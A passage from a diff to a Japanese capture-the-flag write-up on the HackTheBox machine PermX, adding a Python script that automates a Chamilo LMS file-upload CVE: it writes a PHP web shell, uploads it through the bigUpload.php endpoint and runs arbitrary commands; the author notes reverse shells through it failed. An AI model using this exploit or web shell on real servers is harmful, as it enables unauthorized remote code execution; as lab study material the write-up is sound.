@@ -131,7 +131,57 @@ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
 
 ![](screenshot/image-20240707140914353.png)
 
-RCEを実行できることが分かったのでリバースシェルをはる
+このCVEを自動化するスクリプトを作成した
+
+```python
+import requests
+import argparse
+
+def create_php_file():
+    php_code = '<?php system($_REQUEST["cmd"]); ?>'
+    with open('rce.php', 'w') as file:
+        file.write(php_code)
+    print('[+] PHP file created')
+
+def upload_file(url):
+    upload_url = f"{url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
+    files = {'bigUploadFile': open('rce.php', 'rb')}
+    response = requests.post(upload_url, files=files)
+    if response.status_code == 200:
+        print('[+] Upload Success!')
+    else:
+        print('[!] Upload Failed!')
+
+def send_request(url, cmd):
+    request_url = f"{url}/main/inc/lib/javascript/bigupload/files/rce.php?cmd={cmd}"
+    req = requests.get(request_url)
+    print('[+] Send Request\n')
+    print(req.text)
+
+def main():
+    parser = argparse.ArgumentParser(
+        prog='permx_exploit.py', 
+        usage='Demonstration of argparser',
+        description='description', 
+        epilog='end', 
+        add_help=True,
+    )
+    parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('-c', '--cmd', required=True, help='Command to execute')
+    args = parser.parse_args()
+
+    create_php_file()
+    upload_file(args.url)
+    send_request(args.url, args.cmd)
+
+if __name__ == '__main__':
+    main()
+
+```
+
+![](screenshot/image-20240714144531847.png)
+
+しかしこのスクリプトでリバースシェルをいくつか送信してみたが機能しなかった
 
 `php-reverse-shell.php` を使用する
 
